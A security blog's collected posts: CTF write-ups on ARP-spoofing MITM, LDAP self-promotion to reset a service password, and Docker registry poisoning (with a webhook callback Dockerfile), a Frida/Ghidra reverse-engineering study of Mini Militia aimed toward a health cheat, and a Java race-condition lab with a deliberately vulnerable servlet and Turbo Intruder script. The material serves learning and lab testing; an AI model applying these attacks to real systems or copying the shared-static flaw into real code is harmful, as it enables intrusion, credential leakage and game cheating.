title: NNS Devsecoops challenges writeups
content:
Hiding in your WiFi  Description  I'm on your network. There is a client at 10.10.10.20 that keeps fetching something from the web server at 10.10.10.10, and the server only talks to the client.  You are 10.10.10.66. You have arpspoof and tcpdump.    Analysis  The challenge creates an instance with arpspoof and tcpdump. After connecting to remote instace using ncat ncat --ssl hiding-in-your-wifi-25e0d6949410.chall.nnsc.tf 1337, we can find file entrypoint.sh file.  #!/bin/sh set -eu  role="$1"  if [ "$role" = shell ]; then     export HOME=/home/player     exec capsh --keep=1 --user=player \         --inh=cap_net_raw,cap_net_admin --addamb=cap_net_raw,cap_net_admin -- -i fi  POD_IP="${POD_IP:-$(hostname -i)}"  peers="" while read -r name addr hwaddr; do     if [ "$name" = "$role" ]; then         ip=$addr mac=$hwaddr         continue     fi     until peer_ip=$(getent -s files hosts "$name" | cut -d' ' -f1) && [ -n "$peer_ip" ]; do         sleep 1     done     peers="$peers$hwaddr $peer_ip " done <<EOF server   10.10.10.10 02:00:00:00:00:10 victim   10.10.10.20 02:00:00:00:00:20 attacker 10.10.10.66 02:00:00:00:00:66 EOF  ip link add vxlan0 type vxlan id 42 dstport 4789 ttl 64 nolearning \     dev eth0 local "$POD_IP" ip netns add lan ip link set vxlan0 netns lan ip -n lan link set vxlan0 name eth0 address "$mac" ip -n lan addr add "$ip/24" dev eth0 ip -n lan link set eth0 up ip -n lan link set lo up  echo "$peers" | while read -r hwaddr peer_ip; do     if [ -z "$hwaddr" ]; then continue; fi     ip netns exec lan bridge fdb replace "$hwaddr" dev eth0 dst "$peer_ip"     ip netns exec lan bridge fdb append 00:00:00:00:00:00 dev eth0 dst "$peer_ip" done  case "$role" in     server)         exec ip netns exec lan nginx -g 'daemon off;'         ;;     victim)         exec ip netns exec lan sh -c 'while :; do             curl -s -o /dev/null http://10.10.10.10/flag.txt             sleep 5         done'         ;;     attacker)         ip netns exec lan sh -c '             mount -o remount,rw,bind /proc/sys             echo 1 > /proc/sys/net/ipv4/ip_forward             echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects'         exec socat TCP-LISTEN:1337,fork,reuseaddr,max-children=8 \             EXEC:'ip netns exec lan /entrypoint.sh shell',pty,stderr,setsid,sigint,sane         ;; esac   and the machine’s /etc/hosts file  10.0.135.133	attacker-78b499fdff-qrv6x  # Entries added by HostAliases. 172.20.146.162	server 172.20.114.96	victim 172.20.162.78	attacker   Analysis from the script     Three distinct ips to simulate attacker, victim and server within lan namespace.   A VXLAN link is created and attached to lan namespace with mac address learning disabled.   FDB forwarding through VTEP - adds mac addr 02:00:00:00:00:20 routing to 172.20.114.96 and 02:00:00:00:00:10 to 172.20.146.162 and also adds a wildcard mac address routes to those ips. Below command output describes the bridge created.   finally the commands to run for specific roles            server: it starts the server is lan namepsace       victim: curls server for every 5 seconds using lan namespace address[10.10.10.10] and not the actual ip.       attacker: starts a cap shell from the beginning of the script with ip forwarding enabled which is necessary for arpsoof to work.           player@attacker-78b499fdff-qrv6x:/bin$ bridge fdb show bridge fdb show 02:00:00:00:00:20 dev eth0 dst 172.20.114.96 link-netnsid 0 self permanent 00:00:00:00:00:00 dev eth0 dst 172.20.146.162 link-netnsid 0 self permanent 00:00:00:00:00:00 dev eth0 dst 172.20.114.96 link-netnsid 0 self permanent 02:00:00:00:00:10 dev eth0 dst 172.20.146.162 link-netnsid 0 self permanent   Solution  These details are analyzed after the CTF ended to understand how well the lab was created. During CTF, it is clear that attacker should spoof     server that he is victim arpspoof -i eth0 -t 10.10.10.20 10.10.10.10.   victim that attacker is server arpspoof -i eth0 -t 10.10.10.10 10.10.10.20.   since ip forwarding is enabled traffic flows from victim to attacker and from attacker to server without any modification. Now we can dump the tcp traffic using tcpdump.  tcpdump -i eth0 -w /tmp/a.pcap   after few seconds we can stop the capture and read the pcap file and we can find plaintext traffic data in the dump  tcpdump -r /tmp/a.pcap -A 'tcp     Self-Service  Description  You are our brand new contractor at NNS corp! You have been given a user account: ereid:Summer2026. Welcome on board!  SSH is exposed over TLS: ssh -o ProxyCommand='openssl s_client -quiet -connect %h:%p' ereid@HOST -p 1337   Analysis  After connecting with given password for user ereid in SSH, we are inside windows powershell. Only few binaries are present and most of them are LDAP  tools. From the initial analysis it is clear we have to exploit this LDAP user.  ldapsearch -x -D 'uid=ereid,ou=contractors,dc=corp,dc=nns' -W '(objectClass=*)'    This query displays all objectclass and attributes associated with the object. these are some important findings     dn: uid=ops,ou=staff,dc=corp,dc=nns : looks like service account as this is mentioned in GECOS field Operations service account (backup/restore on srv2)   ereid user is member of vpn-users and  onboarding-agents groups.   Solution  Initially I was stuck here and couldn’t proceed furhter, but once the CTF ends the creator shared the way to solve this in discord. the solution is to modify ldap of user ereid to staff.  printf 'dn: uid=ereid,ou=staff,dc=corp,dc=nns
changetype: modrdn
newrdn: uid=ereid
newsuperior: ou=contractors,dc=corp,dc=nns' >move-ereid.ldif   ldapmodify -x -D 'uid=ereid,ou=contractors,dc=corp,dc=nns' -W -f move-ereid.ldif      After modifying OU of the user, we can inspect LDAP attributes again to find out that description of helpdesk group   ldapsearch -x -D 'uid=ereid,ou=staff,dc=corp,dc=nns' -W '(cn=helpdesk)' ... description: First-line IT support. Members are provisioned automatically from   HR attributes. ...      So the next step is to modify specific attributes to join helpdesk group. All the helpdesk user has same title in their attributes, so changing it for ereid user.   printf '%s
' 'dn: uid=ereid,ou=staff,dc=corp,dc=nns' 'changetype: modify' 'replace: title' 'title: Platform Engineer' > title.ldif ldapmodify -x -D 'uid=ereid,ou=staff,dc=corp,dc=nns' -W -f title.ldif      Once the attribute is changed, we are automatically added to helpdesk group. we can change ops service account password.   printf '%s
' 'dn: uid=ops,ou=staff,dc=corp,dc=nns' 'changetype: modify' 'replace: userPassword' 'userPassword: Summer2026' > password.ldif ldapmodify -x -D 'uid=ereid,ou=staff,dc=corp,dc=nns' -W -f password.ldif      After new password is set we can ssh into srv2 server.   cat /etc/hosts ... 172.20.73.162	srv2  ssh ops@srv2 ops@srv2-586969c5bb-6hqsx:~$ ls flag.txt ops@srv2-586969c5bb-6hqsx:~$ cat flag.txt  NNS{a_J0B_71t13_is_n07_aN_aCc35s_c0n7R01_b0UNDarY_4nD_4pp4r3n71y_tH3Re_4R3_4ctu4l_oR65_tH47_Do_stUpid_sH17_1ike_this}     The Builder  Description  People have been complaining about how hard it is to create container images. We took this opportunity to build a SaaS to build ready-to-deploy sites!   Analysis  We are given web server and docker image registry instance. From the website, we can add HTML pages and we will get docker image which we can pull and build container from it.  The docker image step involves,     Base debian image named as theme is pulled.   secret mount is mounted from machine where the image is created and the content is copied to /flag.txt in the theme image.   Page image is pulled from its local registry as content0 which contains our HTML site contents.   And finally a slim nginx container is pulled from chainguard as site. The theme.css and the saved html files are added inside this image and pushed to challenge’s docker image registry.     In the intial analysis I misunderstood that the nginx container image we are provided may contain the flag. But I had challenges debugging the nginx image since it is distroless or more aptly without any shell builtins to debug. Later I used the technique explained (here)[https://iximiuz.com/en/posts/docker-debug-slim-containers/] to export the container and inspect its content. The blog also explains other neat techniques to debug slim containers by mounting utilites with pid namespace inside container 🤯. But as always I wasted lot of time inspecting the nginx container without any progress.  Solution  Since the docker registry provided is unauthenticated, we can pull or push any images. Only the pages and sites created are pushed into the registry but not the theme image where the secret is copied.  curl https://the-builder-registry-02a28d24aee1.chall.nnsc.tf/v2/_catalog                                                           {"repositories":["pages","sites/10631f2c50fb","sites/18c5d3a09668","sites/c39782909640","sites/db9da8cbf2b9"]}  curl https://the-builder-registry-02a28d24aee1.chall.nnsc.tf/v2/pages/tags/list {"name":"pages","tags":["20446622b33c","9c0bf6ca38e8"]}   Since the same page images is used whenever the same content is used, we can push a malicious image to docker registry with same image tag. So I created a simple dockerfile.  FROM alpine  RUN wget https://webhook.site/   creating new image and tagging it with same id as remote image id and pushing it to the registry.  sudo docker build -t test . sudo docker tag test:latest the-builder-registry-02a28d24aee1.chall.nnsc.tf/pages:9c0bf6ca38e8 sudo docker push the-builder-registry-02a28d24aee1.chall.nnsc.tf/pages:9c0bf6ca38e8   Whenever the same page is used we will get callback in our webhook site. Now this made me fall into another rabbit hole on how to achieve code execution[the code executed will be inside the alpine container we specified] or read contents of flag. But the solution is simple, docker has special instruction (ONBUILD)[https://docs.docker.com/reference/dockerfile/#onbuild] which executes instruction when building the next image and it supports COPY instruction. The destination is specified as page as this is the only content that will copied in final step to the nginx container.  FROM alpine  ONBUILD COPY --from=theme /flag.txt /page   Pushing, building, pulling and inspecting the poisoned image.  sudo docker build -t test .  sudo docker tag test:latest the-builder-registry-02a28d24aee1.chall.nnsc.tf/pages:9c0bf6ca38e8  sudo docker push the-builder-registry-02a28d24aee1.chall.nnsc.tf/pages:9c0bf6ca38e8  # after creating new image we can pull the poisoned image from registry sudo docker pull the-builder-registry-02a28d24aee1.chall.nnsc.tf:443/sites/10631f2c50fb:latest  # inspecting by creating container from image sudo docker create --name debugger 587bf75a3e61  # export into contents folder sudo docker export debugger | tar -xC contents /contents/usr/share/nginx/html $ cat ind.html NNS{WH0_tHought_th47_thi5_7R1ggeR_wa5_4_g00d_iDea??_w3ll_4nyw4ys_y0u_did_17}

title: Mini Militia Reverse Engineering
content:
This post demonstrates the reverse engineering of an app to understand its internal workings. It is intended purely for educational purposes and does not promote or encourage online hacking or any malicious activities.   Intro  Hii Everyone, I have been fiddling with mobile game hacking tools recently. Some tools include Lucky Patcher, Game guardian, AceTheGame. These tools work perfectly for offline games patching memory in runtime or modifying dex code for money and health hacks. But then I wanted to tweak with some online game. Since Mini militia offers both online and LAN mode games, I selected it as it will be easier for debugging. I started like always with apk decompilation jadx. Intial analysis reveals that the app uses cocos2d as game engine as lib/arm64-v8a contains libcocos2dcpp.so.  Black Box scan  My intial approach is to capture the traffic and analyze the packets prior to source code analysis. The application uses raknet. Since it used UDP as underlying protocol. Since this is UDP based traffic, burp suite won’t work here unless used with some extension like NoPE proxy. Mitmproxy have support for UDP traffic capture but I used wireshark to capture the traffic hoping that it doesn’t encrypt packets. Wirehark has support for filtering and displaying raknet protocol traffic. Since ref. Applying only raknet filter displays ony Raknet packets. The raknet packet identifiers filters raknet.offline.message.id are useful in filtering specific packets which are mentioned here    I created a LAN match and make my other device join the same room and generated some traffic. Sending chat messages, changing game configurations and playing a short game to generate more traffic. The game specific packets doesn’t follow a stand raknet packets identifier, using filter raknet && raknet.unknown.id, I was able to see the chat message  foobar in the traffic. Similar to this other traffic is also cpatured as unknow message id. With this information let’s try to understand the traffic structure and decode it.    White Box scan  I loaded the library in ghidra and started analyzing the functions. I analyzed all functions and found lot of raknet functions used inside binary, Apart from this I needed a pivot point to start my reversing, I started with ServerState::processServerPackets .  void _ZN11ServerState20processServerPacketsEv(long param_1)  {   ...      lVar3 = tpidr_el0;   lVar3 = *(long *)(lVar3 + 0x28);   local_70 = *(long **)(param_1 + 0x10);   (**(code **)(*local_70 + 200))();   while( true ) {     if (local_70 == (long *)0x0) {       lVar2 = tpidr_el0;       if (*(long *)(lVar2 + 0x28) == lVar3) {         return;       }     }   } }   As the first param is dereferenced and used for calling methods. It is clear that param_1 represents an VTable object. So I analyzed the same using this frida script to understand what does it represents.  const MODULE   = 'libcocos2dcpp.so'; const SYM      = '_ZN11ServerState20processServerPacketsEv'; const PEER_OFF = 0x10;  function hook(){     const gameEngine = Process.getModuleByName(MODULE);     const p = gameEngine.getExportByName(SYM)     const addr = p;     const base = gameEngine.base;     // for finding the offset from base address     const gh = (p) => 'off:0x' + p.sub(base).toString(16);      Interceptor.attach(addr, {         onEnter(args) {         const self = args[0];         let peer = ptr(0), vt = ptr(0);         try { peer = self.add(PEER_OFF).readPointer(); } catch (e) {}         try { vt = peer.isNull() ? ptr(0) : peer.readPointer(); } catch (e) {}                      console.log('
[processServerPackets] #' + n);             console.log('this (ServerState*) = ' + self + '  (' + gh(self) + ')');             console.log('this+0x10 peer      = ' + peer + (peer.isNull() ? '' : '  (' + gh(peer) + ')'));             console.log('peer->vtable        = ' + vt +                         (vt.isNull() ? '' : '  ' + DebugSymbol.fromAddress(vt)));              console.log(" address is "+gh(vt))             // prints 0x1369f50             // leads to hex(0x1369f50 + 0x100000) => 0x1469f50         }     }); };  if (!hook()) {   console.log('starting');   const iv = setInterval(() => { if (hook()) clearInterval(iv); }, 200); }   0x1469f50 address represents raknetPeer vtable whose methods closely resembles this raknetpeerinterface.h file, but it also lists additional methods other.    Since there are lot of branch instructions ghidra struggled with disassembly so I used online arm diassembler to view instruction code instead of ghidra’s disassembler. I analyzed each and every branch instruction since the code indicates multiple branch, I found branch to  _ZN11ServerState17ClientPeerMessageEPN6RakNet6PacketE from the address. I hooked this but I didn’t received any calls in this methods. Maybe because I was trying to be host in local game, this method is not used. So I tried next branch and it points to _ZN11ServerState22ClientBroadcastMessageEPN6RakNet6PacketEbbat address 0x4e9a30. Adding 0x100000 [ghidra base address]to this address, we can inspect its function in ghidra.    I made similar script to debug the arguments passed here. This method already has call to `            _ZN11ServerState14ProcessMessageEPN6RakNet6PacketEP11ClientEntryb(param_1,param_2,lVar4,0)` which looks like base class for processing server message. Modified above script for  const SYM      = '_ZN11ServerState22ClientBroadcastMessageEPN6RakNet6PacketEbb'; ...  const self = args[0]; const arg1  = args[1]; const arg2 = args[2]; const arg3 = args[3];  console.log('
[ClientBroadcastMessage]'); console.log('this => ' + self + ' offset=>'+ gh(self)); console.log('debug => ' + DebugSymbol.fromAddress(self.readPointer())) console.log('arg1 => ' + arg1 + ' offset=>'+ gh(self)); console.log('debug => ' + DebugSymbol.fromAddress(arg1.readPointer()))  // O/P // [ClientBroadcastMessage] // this => 0xb40000710ca32d20 offset=>off:0xb400000178629d20 // debug => 0x6f95755758 libcocos2dcpp.so!_ZTV9ServerLAN+0x10 // arg1 => 0xb40000710ca22628 offset=>off:0xb400000178629d20 // debug => 0x100007fe1100002   There are other two arguments but it looks like boolean and not necessary for now. It is clear that ServerLAN instance with +0x10 offset is passed as a pointer here. From ghidra it is evident that relocation table like _ZTV9ServerLAN which points to other methods. Applying c++filt to mangled name also helps in recovering the arguments type. So the first argument is Raknet::Packet pointer.  echo "_ZN11ServerState22ClientBroadcastMessageEPN6RakNet6PacketEbb" | c++filt      ServerState::ClientBroadcastMessage(RakNet::Packet*, bool, bool)  echo "_ZN11ServerState14ProcessMessageEPN6RakNet6PacketEP11ClientEntryb" | c++filt  ServerState::ProcessMessage(RakNet::Packet*, ClientEntry*, bool)   So the first argument _ZTV9ServerLAN pointer plus +0x18 is a object being queried from _ZTV9ServerLAN+0x18 [0x0144c748+0x18] and then the value from _ZNK14DataStructures3MapIN6RakNet10RakNetGUIDEP11ClientEntryXadL_ZNS_23defaultMapKeyComparisonIS2_EEiRKT_S8_EEE3GetERKS2_ is passed as argument as ClientEntry * for ProcessMessage call.  echo "_ZNK14DataStructures3MapIN6RakNet10RakNetGUIDEP11ClientEntryXadL_ZNS_23defaultMapKeyComparisonIS2_EEiRKT_S8_EEE3GetERKS2_" | c++filt DataStructures::Map<RakNet::RakNetGUID, ClientEntry*, &(int DataStructures::defaultMapKeyComparison<RakNet::RakNetGUID>(RakNet::RakNetGUID const&, RakNet::RakNetGUID const&))>::Get(RakNet::RakNetGUID const&) const    Again ServerState::ProcessMessage has inconsistent decompilation in ghidra, so I copied again the byte string and used online compiler. This time there are two branches with blr instruction others branches to other parts of same function. Starting with first blr call, it loads x9 from stack pointer which points to first argument + 0x10, which as already discovered a _ZTV9ServerLAN Vtable. It adds another 0x98 and calls what it is stored in that address which turns out to be hex(0x0144c748 + 0x10 + 0x98) => '0x144c7f0' _ZN9ServerLAN20processPlayerMessageEPN6RakNet6.  ldr x8, [sp, #0x10] ldr x9, [x8] ldr x9, [x9, #0x98] ldur x1, [x29, #-0x18] ldurb w2, [x29, #-0x28] ldr x3, [sp, #0x30] ldrh w4, [sp, #0x2c] ldur x5, [x29, #-0x20] mov x0, x8 blr x9   The second blr call was a little tricky, since the return type of ServerState::GetRoom returns ClientRoomLAN. A differenct object different than previous ServerLAN object. I stuck in this part for long time trying to look at different offset, but dynamic analysis gave a strong verdict that the return type is _ZTV13ClientRoomLAN+0x10. Same like previous script but this time hooked _ZN11ServerState7GetRoomEP11ClientEntry method and analyzed the input arguments and return type.  function typeOf(p) {   try {     if (p.isNull()) return '(null)';     return p + '   ' + DebugSymbol.fromAddress(p.readPointer());   } catch (e) { return p + '   (unreadable)'; } }  ... function hook(){   const mod = Process.findModuleByName(MODULE);   if (!mod) return false;   const addr = mod.getExportByName(SYM);    Interceptor.attach(addr, {     onEnter(args) {       this.self  = args[0];       this.entry = args[1];     },     onLeave(retval) {       const room = ptr(retval.toString());   // RETURN value = ClientRoom* (predicted)       console.log('
[GetRoom]');       console.log('arg0 this         = ' + typeOf(this.self));       console.log('arg1 ClientEntry* = ' + typeOf(this.entry));       console.log('RET  room         = ' + typeOf(room));     }   });   console.log('[+] hooked GetRoom @ ' + addr);   return true; } ...   //Output //[GetRoom] //arg0 this         = 0xb40000710ca34140   0x6f9834f758 libcocos2dcpp.so!_ZTV9ServerLAN+0x10 //arg1 ClientEntry* = 0xb4000070eca600c0   0x6f9834fa80 libcocos2dcpp.so!_ZTV11ClientEntry+0x10 //RET  room         = 0xb40000717ca99290   0x6f9834fab8 libcocos2dcpp.so!_ZTV13ClientRoomLAN+0x10    bl 0x5fc3c0                 // _ZN11ServerState7GetRoomEP11ClientEntry str x0, [sp, #0x18]         // saves it in sp ldr x0, [sp, #0x18]         // loads it in x0 cbz x0, 0x935a58            // null check ldr x8, [sp, #0x18]          ldr x9, [x8]                // not sure of it ldr x9, [x9, #0x170]        // loads address from +0x170 -> which is _ZN13ClientRoomLAN20processPlayerMessage ldur x1, [x29, #-0x18] ldurb w2, [x29, #-0x28] ldr x3, [sp, #0x30] ldrh w4, [sp, #0x2c] ldur x5, [x29, #-0x20] mov x0, x8 blr x9                      // calls _ZN13ClientRoomLAN20processPlayerMessage with args    After decompiling _ZN13ClientRoomLAN20processPlayerMessage and _ZN9ServerLAN20processPlayerMessageEPN6RakNet6, these two two looks like the significant method where most of the call dispatcher happens.  _ZN9ServerLAN20processPlayerMessageEPN6RakNet6  Since there are lot of branch statement here, ghidra threw error too many branches to recover a jumptable . So I used claude to generate a switch statement recovery from the Jump table. The disassembly shows that it loads offset address from DAT_0118c3c0 as 32 bit int, these address hold the offset to be added to the current function base address. So it recursively reads byte at the address and add it to the base addres to point to current location.   from ghidra.program.model.symbol import RefType, SourceType from ghidra.program.model.pcode import JumpTable from java.util import ArrayList  JUMP = toAddr(0x929864)     # the `br x8` indirect branch TBL  = toAddr(0x118c3c0)    # jump-table base in .rodata (s32 offsets from here) N    = 0x25                 # 37 entries  (opcode = index + 7)  mem    = currentProgram.getMemory() refmgr = currentProgram.getReferenceManager() func   = getFunctionContaining(JUMP) if func is None:     print("No function contains 0x%x -- aborting" % JUMP.getOffset()) else:     dests = ArrayList()     seen  = set()     for i in range(N):         rel = mem.getInt(TBL.add(i * 4))        # signed 32-bit offset         tgt = TBL.add(rel)                        # target relative to table base         dests.add(tgt)         # navigable COMPUTED_JUMP ref so the listing shows case arrows         refmgr.addMemoryReference(JUMP, tgt, RefType.COMPUTED_JUMP,                                   SourceType.USER_DEFINED, 0)         if tgt.getOffset() not in seen:             seen.add(tgt.getOffset())             if getInstructionAt(tgt) is None:                 disassemble(tgt)       # the key step: explicit override the decompiler will honor     jt = JumpTable(JUMP, dests, True)     jt.writeOverride(func)     print("Override written: %d entries (%d unique targets) at 0x%x"           % (N, len(seen), JUMP.getOffset()))     print("Now re-decompile %s (press F5) to see the full switch(opcode)."           % func.getName())     try:         from ghidra.app.decompiler import DecompInterface         di = DecompInterface(); di.openProgram(currentProgram)         di.decompileFunction(func, 30, monitor)         di.dispose()     except:         pass   Load this script in ghidra, run it and decompile again for ghidra to process the switch case and its handling. The switch statements are recovered now and it decompiles correctly to show calls made to other methods.    case 0x23:     _ZN9ServerLAN24processPlayerChatMessageEPN6RakNet6PacketEPcP11ClientEntryP11ServerState               (param_1,param_2,param_4,param_6,param_1);     if (((ulong)param_1 & 1) == 0) {       local_51 = 0;       goto LAB_009299d0;     }     break;   _ZN13ClientRoomLAN20processPlayerMessage  The _ZN13ClientRoomLAN20processPlayerMessage is thunk function for _ZN10ClientRoom20processPlayerMessageEPN6RakNet6PacketEcPctP11ClientEntry where most of the stuff happens. Same like above method, this too have lot of branch statements. I used same script again with modified address and recovered the switch cases. Since this function uses lot of references from this param [ClientRoom]. To ease up the analysis, I added new data structure, by adding +x10 to _ZTV10ClientRoom address -> 0144ce58. Selecting all the bytes upto 0144d120 and created new structure and named it as ClientRoom_vftable. Then created new data type with name ClientRoom and modified data type pointing to ClientRoom_vftable *.  Now the name field can be added to ClientRoom_vftable to make the calls much cleaner.    case 0xb:     if (param_4 == 0) {       local_11 = 0;       goto LAB_0095d764;     }     (*(code *)param_1->﻿vftable->﻿processPlayerDamageMessage)               (param_1,param_2,param_4,param_5,param_6);     if (((ulong)param_1 & 1) == 0) {       local_11 = 0;       goto LAB_0095d764;     }   For example here switch case 0xb which relates to opcode 0x1a since opcode param_3 is subtracted 0x7 in the code. This specific opcode handles processPlayerDamageMessage. which can be hooked and modified to make infinite health cheat. Since our device act as server we can make the client think that the damage is negligible.  Summary  This is the final summarized opcode and message dispatcher found from the above two methods.                 opcode       function       handler                       0x07       ServerLAN       (accepted, no-op)                 0x08       ServerLAN       (send 0x888 message via vtable[0])                 0x0f–0x16       ClientRoom       processPlayerLocation                 0x17–0x19       ClientRoom       processWeaponMoved                 0x1a       ClientRoom       processPlayerDamageMessage                 0x1b       ClientRoom       processExplosion                 0x1c       ClientRoom       processPlayerWeaponChange                 0x1d       ClientRoom       processWeaponCreate                 0x1e       ClientRoom       processWeaponRemove                 0x1f       ClientRoom       processWeaponCorrection                 0x25       ServerLAN       processPlayerSetupMessage                 0x2a       ServerLAN       processPlayerChatMessage                 0x30       ClientRoom       processRemoveGas                 0x41       ClientRoom       processPlayerSpawnRequest                 0x46       ClientRoom       processWeaponStateChange                 0x48       ClientRoom       processRemoveGas

title: Race condition in static variable [Java]
tags: Java, Web, Security, Source Code Analysis, Lab
content:
Introduction  Few weeks before, I was working on java source code analysis and found a race condition. Initially the finding felt inconsequnetial, but after a working POC I was able to prove the impact of the bug.  This posts will cover both my thoughts and approach to race condition bugs[specifically to web] and how was I able to exploit it. I am sure AI can write exploit for these bugs easily but understanding what is happening under the hood can help gain deeper insights of the bug and troubleshoot the payload more efficiently.  Race condition  Race condition is one of the complicated bug in application security. Most Linux, browser and kernel based CVEs uses race condition, but in scope of web security it is often overlooked. It doesn’t have specific category in OWASP top 10. It is often considered as business logic flaws. Portswigger labs has well documented black box approach to this. These are the techniques explained from hacktricks          HTTP/1.1 last-byte synchronization technique   sending most part of packets like header and body contents and holding the last byte in each packet and fire the request when all packets are ready.           HTTP/2 single-packet attack  Since HTTP/2 supports multiple HTTP requests in a single TCP connection, sending simultaneous requests within small window to trigger race condition.           HTTP/3 Last frame synchroniztion  HTTP/3 uses QUIC over UDP for data transmission. Single Packet Attack by last frame synchronization. H3spacex has lab and QUIC frame control library for easier exploitation.      Types and techniques  This section I mainly need to cover the types of attack explained in portswigger labs.     Limit overrun: This is perfect for testing againt features like coupon code redemption, like count incrementer or any actions which a normal user should apply once. Inserting Multiple requests in new tab group in burp repeater and use Send group in parallel to cause uncontrollable sequence. Burp will decide last byte synchronization or single packet attack depending upon the HTTP version.   Example bug: Race Condition for Access Token          Race condition using turbo intruder: In this lab we are introduced with turbo intruder where we are provided python scripting interface to manipulate the request/response. Turbo intruder provides simple interface to modify request params along with script file. These are some turbo intruder sample scripts. In this lab we use single packet attack script in turbo intruder to bypass login bruteforce. For each login attempt there is cooldown period from server so we tried set of 5-6 password attempts in each turbo intruder request.           Mutli and single endpoint race condition      Single endpoint race condition is simpler than multi endpoint race condition. The difference being that single endpoint may perform multiple actions and when the race is timed perfectly it can cause request being handled in different scope in race window.    Common scenarios include export endpoint where the exposed /export API can call internal microservice for export or Invitation flow where registration endpoint triggers email sending as separate workflow.  Multi endpoint race condition is more difficult to exploit as the race window between each requests should be timed perfectly. The lab environment provided by portswigger demonstrates a situation where balance is checked and adding more expensive item to cart just before the cart is checked out. This is classic TOCTOU[Time-of-check to Time-of-use] vulnerability.  The methodology described by portswigger is Predict, Probe and Prove. Predicting security critical endpoints and if there is collision possible. Probe the endpoints and understand the nature of response - the labs introduces us to add inconsequential request [index page] of the target in the flow to make the subsequest request’s response time similar. This way the first request will be incosequential request followed by mutli endpoints which is affected by race condition to minimize the race window. And finally prove the concept and escalate the severity. Smashing the state machine research blog explains all this in detail.     Time sensitive attacks   This is more common finding in any SAST tools when for any cryptographic functions if the seed uses current time or any constant value which can cause multiple request to same output. In order to validate the finding send the two similar requests simultaneously/parallely and investigate the response time or response token. Once found it is possible to exploit the same for two distinct requests and the reponse token/secret would be same for both the requests.  The Vulnerability  Race condition can occur when program depends on uncoordinated timing or sequence, shared mutable state, instantiating threadlocal variable and not clearing it, concurrency and many more. Here I have configured struts to look for inputName inputstream as response.  <action name="credential" class="org.example.demo.CredentialServlet" method="fetchCreds">    <result name="success" type="stream">          <param name="contentType">application/json</param>          <param name="inputName">inputStream</param>    </result> </action>   The Servlet fetches credentials depending upon the id. Since this is demo setup I haven’t added any authN checks or thresholds. The setup is simple     If requesting id is 1, admin credential will be served.   If requesting id is other than 1, normal user credenial will be served.   The important takeaway is under heavy traffic time, this race condition allows cross user response access.   public class CredentialServlet {     private static  InputStream inputStream;     private int id;          @StrutsParameter     public void setId(int id) {         this.id = id;     }     // GET http://server/credential.action?id=1     public String fetchCreds() {         JSONObject response = new JSONObject();         User u = new User().getUser(id);         response.put("name", u.getName());         response.put("password", u.getPassword());         response.put("STATUS", 200);          inputStream = new ByteArrayInputStream(                 response.toString().getBytes(StandardCharsets.UTF_8));          return Action.SUCCESS;     }      public InputStream getInputStream() {         return inputStream;     } }   public class User {    // constructors, getters and setters ...     public User getUser(int id){       if(id == 1){          return new User(1, "Admin","Admin-Password");       } else {          return new User(2, "foobar","foobar-Password");       }    } }   Exploitation  To demonstrate this, I have modified single-packet-attack.py, user Engine.THREADED since the HTTP version 1 is used. The CONCURRENT_CONNECTIONS count is maximum number of connection the gate can open and we are running 200 iterations with 2 different request requests trying to race in same window.  ITERATIONS = 200 CONCURRENT_CONNECTIONS = 30   ACCOUNTS = {     "userA": {         "id": "1",     },     "userB": {         "id": "2",     }, }  PATH_TEMPLATE = "/demo_war_exploded/credential.action?id={id}"   def build_request(account,gate):     path = PATH_TEMPLATE.format(id=account["id"])     return (         "GET " + path + " HTTP/1.1
"         "Host: 192.168.0.107:8000
"         "Connection: close
"         "Gate: " + gate + "
"         "
"     )   def queueRequests(target, wordlists):     engine = RequestEngine(         endpoint=target.endpoint,         concurrentConnections=CONCURRENT_CONNECTIONS,         engine=Engine.THREADED,     )      # reqA = build_request(ACCOUNTS["userA"])     # reqB = build_request(ACCOUNTS["userB"])       for i in range(ITERATIONS):         gate = str(i)         reqA = build_request(ACCOUNTS["userA"],gate+"-A")         reqB = build_request(ACCOUNTS["userB"],gate+"-B")         engine.queue(reqA, gate=gate,label=gate)         engine.queue(reqB, gate=gate,label=gate)         engine.openGate(gate)      engine.complete(timeout=60)   def handleResponse(req, interesting):     try:         body = req.response or ""     except Exception as e:         body = ""         print("Exception:  (%s)" % e)      has_a = "Admin" in body     has_b = "foobar" in body      if "Admin" in body and "id=2" in req.request:         # adding this request alone to the table         try:             print(req.label)             table.add(req)         except Exception as e:             print("table.add failed: %s" % e)      Analysis  For analysis I have added interceptor to log request start, end and elapsed time along with gate identifier which is added as header in request.  public class RequestInterceptor extends AbstractInterceptor {     @Override     public String intercept(ActionInvocation invocation) throws Exception {          HttpServletRequest request =                 ServletActionContext.getRequest();          String gate = request.getHeader("Gate");         long startTime = System.currentTimeMillis();          try {             return invocation.invoke();         } finally {             long endTime = System.currentTimeMillis();             System.out.println("Gate: " + gate + " -- " + "Start time: "+startTime+ " ms" + " -- " + "End time: " + endTime + " ms" + " -- " +"Elapsed time: "                     + (endTime - startTime) + " ms");         }     } }   The interceptor output suggests that the when processing 49-A Admin request request the server received request 50-B normal request. From the time analysis we can confirm that both request got served at exact time leading to cross user leak.  Gate: 50-A -- Start time: 1792587230539 ms -- End time: 1792587230541 ms -- Elapsed time: 2 ms Gate: 49-A -- Start time: 1792587230538 ms -- End time: 1792587230541 ms -- Elapsed time: 3 ms Gate: 50-B -- Start time: 1792587230538 ms -- End time: 1792587230541 ms -- Elapsed time: 3 ms   The entire application is hosted at github, do check it out.  Conclusion  What looked like insignificant finding but as I digged deeper the impact became huge. This is a decade old problem, but still it can be found in large and complex code bases. If time I will explore more on the modern version of this bug class researched by James Kettle from Portswigger.  References  https://portswigger.net/blog/new-techniques-and-tools-for-web-race-conditions https://portswigger.net/research/smashing-the-state-machine  https://portswigger.net/research/the-single-packet-attack-making-remote-race-conditions-local https://hackerone.com/reports/55140

title: TCP1P CTF 2024 Android Writeup
